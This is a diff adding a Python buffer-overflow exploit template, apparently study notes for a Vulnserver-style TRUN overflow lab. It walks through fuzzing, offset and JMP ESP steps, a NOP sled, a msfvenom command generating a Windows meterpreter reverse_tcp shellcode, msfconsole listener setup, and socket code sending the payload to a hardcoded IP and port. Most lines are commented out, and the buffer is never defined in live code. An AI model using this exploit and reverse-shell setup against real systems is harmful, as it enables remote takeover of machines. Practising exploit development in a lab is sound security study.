@@ -280,7 +280,49 @@ Run Immunity as Administrator
     print s.recv(1024) #print response
 
     s.close() # Close the Socket
+# WholeScript
+    #!/usr/bin/python
+    import socket
 
+    #buf = "TRUN /.:/"
+    ###FUZZING###
+    #buf += "A" * 5000
+
+    ###Wiremask##
+    #buf += "<wiremaskstring>"
+    ####OFFSET###
+    #buf += "A" * 2003
+    #buf += "BBBB"
+
+    ### Find JMP ESP ###
+    #use is imunity#
+    # !mona modules   # look for unportected dlls
+    # !mona jmp -r esp -m "essfunc.dll" windows > log data > take top 3 regisstry addresses
+    #buf += " \xa0\x12\x50\x62"
+    ### NOP SLED ###
+    #buf += "\x90" * 15
+
+    ###SHELL CODE ####
+    ##msfvenom -p windows/meterpreter/reverse_tcp lhost=<target ip> lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python
+    ### msf CONSOLE ###
+    '''
+    msfconsole
+    use multi//handler
+    show options
+    set payload windows/meterpreter/reverse_tcp
+    set LHOST 0.0.0.0
+    set LPORT 4444
+    exploit
+
+    '''
+    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create the ipv4 socket, tcp protocol
+    s.connect (("10.50.152.93",9999)) #Connect to target IP and port 
+    print s.recv(1024) #print response
+    s.send(buf) #send the value of buf
+    print s.recv(1024) #print response
+
+    s.close() # Close the Socket
+        
 
 
 
